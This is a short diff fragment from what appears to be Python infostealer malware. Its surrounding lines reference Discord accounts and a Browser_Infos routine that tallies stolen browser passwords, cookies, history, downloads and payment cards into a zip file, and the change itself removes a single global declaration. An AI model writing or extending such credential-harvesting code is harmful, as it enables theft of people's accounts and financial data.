@@ -814,7 +814,6 @@ Discord Hesabı n°{str(number_discord_account)}:
 
     @staticmethod 
     def Browser_Infos(zip_file, browser_choice):
-        global number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
         browsers = []
         number_cards = 0; file_cards = []
         number_cookies = 0; file_cookies = []
